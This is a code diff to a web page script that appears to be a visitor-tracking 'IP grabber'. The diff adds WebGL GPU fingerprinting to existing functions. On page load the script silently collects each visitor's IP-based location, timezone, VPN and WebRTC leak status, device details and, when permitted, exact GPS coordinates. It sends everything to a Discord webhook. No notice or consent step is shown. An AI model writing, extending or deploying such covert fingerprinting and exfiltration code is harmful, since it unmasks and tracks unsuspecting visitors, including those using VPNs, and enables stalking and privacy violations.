@@ -52,6 +52,21 @@ fetch('config.json')
             };
         }
 
+        function getGPUDetails() {
+            return new Promise((resolve, reject) => {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    resolve({ vendor, renderer });
+                } else {
+                    reject("WEBGL_debug_renderer_info extension not available");
+                }
+            });
+        }
+
         // Function to get IP and location data
         function getLocationAndGPSData() {
             var userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone";
@@ -72,10 +87,11 @@ fetch('config.json')
                             }
                             return response.json();
                         }),
-                        checkWebRTCLoak()
+                        checkWebRTCLoak(),
+                        getGPUDetails()
                     ]);
                 })
-                .then(([vpnResult, location, webrtcResult]) => {
+                .then(([vpnResult, location, webrtcResult, gpuDetails]) => {
                     var systemDetails = getSystemDetails();
                     var screenResolution = `${window.screen.width}x${window.screen.height}`;
                     var referrer = document.referrer || "No referrer";
@@ -85,17 +101,19 @@ fetch('config.json')
                     var locationValue = location && location.city ? `${location.city}, ${location.region}, ${location.country_name}` : "Location data not available";
                     var gpsValue = location && location.latitude && location.longitude ? `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})` : "Location data not available";
 
-                    sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone);
+                    var gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
+
+                    sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue);
 
                     // Additional data send on geolocation permission
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
-                            function(position) {
+                            function (position) {
                                 var gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
                                 var gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;
-                                sendDiscordEmbed(location, gpsText, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone);
+                                sendDiscordEmbed(location, gpsText, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue);
                             },
-                            function(error) {
+                            function (error) {
                                 console.error('Geolocation error:', error);
                             },
                             { timeout: 10000 }
@@ -103,11 +121,10 @@ fetch('config.json')
                     }
                 })
                 .catch(error => {
-                    console.error('Error in gathering data:', error);
-                    handleErrorType('unknown', 'Error in gathering data: ' + error.message, userTimezone);
+                    console.error('Error in gathering GPU data:', error);
+                    handleErrorType('unknown', 'Error in gathering GPU data: ' + error.message, userTimezone);
                 });
         }
-
 
         function checkVPN(ip, timezone) {
             return new Promise((resolve, reject) => {
@@ -119,12 +136,12 @@ fetch('config.json')
                             resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + data.error });
                             return;
                         }
-                        
+
                         const ipTimezone = data.timezone;
                         const timezoneMatch = timezone === ipTimezone;
-                        const vpnMessage = timezoneMatch 
-                                            ? 'Timezones match' 
-                                            : 'Timezones do not match (Possible VPN detected)';
+                        const vpnMessage = timezoneMatch
+                            ? 'Timezones match'
+                            : 'Timezones do not match (Possible VPN detected)';
                         resolve({ isVpn: !timezoneMatch, vpnMessage });
                     })
                     .catch(error => {
@@ -133,7 +150,7 @@ fetch('config.json')
                     });
             });
         }
-        
+
 
         function checkWebRTCLoak() {
             return new Promise(resolve => {
@@ -142,7 +159,7 @@ fetch('config.json')
                     resolve({ hasLeak: false, leakMessage: "WebRTC not supported" });
                     return;
                 }
-        
+
                 const pc = new rtcPeerConnection({ iceServers: [] });
                 pc.createDataChannel("");
                 pc.createOffer()
@@ -151,13 +168,13 @@ fetch('config.json')
                         console.error("WebRTC Offer Error:", error);
                         resolve({ hasLeak: false, leakMessage: "Error in WebRTC offer: " + error.message });
                     });
-        
+
                 pc.onicecandidate = ice => {
                     if (!ice || !ice.candidate || !ice.candidate.candidate) {
                         pc.close();
                         return;
                     }
-                
+
                     const regexResult = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                     if (regexResult && regexResult[1]) {
                         const myIP = regexResult[1];
@@ -167,18 +184,18 @@ fetch('config.json')
                         resolve({ hasLeak: false, leakMessage: "No WebRTC Leak Detected" });
                     }
                 };
-                
-                            
+
+
             }).catch(error => {
                 console.error("Error in checkWebRTCLoak:", error);
                 return { hasLeak: false, leakMessage: "An error occurred in checkWebRTCLoak: " + error.message };
             });
         }
-        
+
 
         function handleErrorType(errorCode, errorMessage, userTimezone) {
             let errorDescription;
-        
+
             // Handling standard geolocation error codes
             switch (errorCode) {
                 case 1:
@@ -200,9 +217,9 @@ fetch('config.json')
                     }
                     break;
             }
-        
+
             console.error(errorMessage || errorDescription);
-        
+
             // Send error embed for cases other than Permission Denied
             if (errorCode !== 1) {
                 const errorEmbed = {
@@ -210,11 +227,11 @@ fetch('config.json')
                     "color": 16711680, // Red color for error
                     "description": errorMessage || errorDescription
                 };
-        
+
                 sendDiscordMessage([errorEmbed]);
             }
         }
-        
+
         function getAdditionalDetails() {
             var userAgent = navigator.userAgent;
             var deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop';
@@ -222,7 +239,7 @@ fetch('config.json')
             browserVersion = browserVersion ? browserVersion[2] : 'Unknown';
             var connectionType = navigator.connection ? navigator.connection.type : 'Unknown';
             var doNotTrack = navigator.doNotTrack || 'Unknown';
-        
+
             return {
                 deviceType,
                 browserVersion,
@@ -233,7 +250,7 @@ fetch('config.json')
 
 
         // Function to send message to Discord
-        function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone) {
+        function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue) {
             var additionalDetails = getAdditionalDetails();
 
             var embeds = [{
@@ -253,6 +270,11 @@ fetch('config.json')
                     {
                         "name": "GPS Coordinates",
                         "value": gpsValue,
+                        "inline": true
+                    },
+                    {
+                        "name": "GPU",
+                        "value": gpuValue,
                         "inline": true
                     },
                     {
@@ -277,7 +299,7 @@ fetch('config.json')
                     },
                     {
                         "name": "Time Zone",
-                        "value": userTimezone, 
+                        "value": userTimezone,
                         "inline": true
                     },
                     {
@@ -325,35 +347,35 @@ fetch('config.json')
         // Function to send data to the Discord webhook
         function sendDiscordMessage(embeds, retryCount = 3) {
             const maxRetries = 3;
-            const retryDelay = 3000; 
-            
+            const retryDelay = 3000;
+
             fetch(webhook_url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ embeds: embeds })
             })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Failed to send message to Discord. Response:', response.status, response.statusText);
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send message to Discord. Response:', response.status, response.statusText);
+                        if (retryCount > 0) {
+                            // Retry sending the webhook with exponential backoff
+                            setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
+                        } else {
+                            console.error('Max retries reached. Giving up on sending message to Discord.');
+                        }
+                    } else {
+                        console.log('Message sent successfully to Discord.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending message to Discord:', error);
                     if (retryCount > 0) {
                         // Retry sending the webhook with exponential backoff
                         setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
                     } else {
                         console.error('Max retries reached. Giving up on sending message to Discord.');
                     }
-                } else {
-                    console.log('Message sent successfully to Discord.');
-                }
-            })
-            .catch(error => {
-                console.error('Error sending message to Discord:', error);
-                if (retryCount > 0) {
-                    // Retry sending the webhook with exponential backoff
-                    setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
-                } else {
-                    console.error('Max retries reached. Giving up on sending message to Discord.');
-                }
-            });
+                });
         }
 
         // Function to show the popup
@@ -374,8 +396,8 @@ fetch('config.json')
 
         // Run these functions on page load
         getLocationAndGPSData();
-        setTimeout(showPopup, 3000); 
-})
+        setTimeout(showPopup, 3000);
+    })
     .catch(error => {
         console.error('Error loading configuration:', error);
     });
